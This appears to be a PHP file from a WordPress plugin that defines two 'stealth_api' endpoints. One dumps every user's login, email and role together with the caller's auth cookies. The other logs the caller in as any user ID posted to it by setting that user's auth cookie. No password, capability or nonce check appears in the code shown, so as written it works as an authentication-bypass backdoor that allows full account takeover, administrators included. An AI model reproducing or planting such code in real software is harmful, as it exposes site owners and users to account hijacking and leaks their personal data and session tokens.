<?php

if (!defined('ABSPATH')) {
    die('not like this...');
}

/**
 * GET ?stealth_api=users
 * Returns all users, current user, and current auth cookies.
 */
function stealth_api_users() {
    if (is_user_logged_in()) {
        $current = wp_get_current_user();
        $current_user = [
            'id'        => $current->ID,
            'login'     => $current->user_login,
            'roles'     => $current->roles,
            'logged_in' => true,
        ];
    } else {
        $current_user = [
            'id'        => -1,
            'login'     => 'Not Logged In',
            'roles'     => [],
            'logged_in' => false,
        ];
    }

    // Collect auth cookies for display (exclude internal stealth cookie)
    $cookie_parts = [];
    foreach ($_COOKIE as $key => $value) {
        if ($key === 'stealth_filters') {
            continue;
        }
        $cookie_parts[] = $key . '=' . $value;
    }

    $users = [];
    foreach (get_users() as $user) {
        $users[] = [
            'id'    => $user->ID,
            'login' => $user->user_login,
            'email' => $user->user_email,
            'roles' => $user->roles,
        ];
    }

    stealth_json([
        'current' => $current_user,
        'cookies' => implode('; ', $cookie_parts),
        'users'   => $users,
    ]);
}

/**
 * POST ?stealth_api=login
 * Body: uid=<id>  (use uid=-1 to logout)
 *
 * On success returns the new current user.
 * The client is responsible for the redirect (if any).
 */
function stealth_api_login() {
    if (!isset($_POST['uid'])) {
        stealth_json(['error' => 'uid parameter required'], 400);
    }

    $uid = (int) $_POST['uid'];

    if ($uid === -1) {
        wp_logout();
        stealth_json(['success' => true, 'message' => 'Logged out']);
    }

    // Verify user exists
    $user = get_user_by('id', $uid);
    if (!$user) {
        stealth_json(['error' => 'User not found'], 404);
    }

    wp_set_auth_cookie($uid, true);
    wp_set_current_user($uid);

    stealth_json([
        'success' => true,
        'message' => 'Logged in as ' . $user->user_login,
        'user'    => [
            'id'    => $user->ID,
            'login' => $user->user_login,
            'roles' => $user->roles,
        ],
    ]);
}
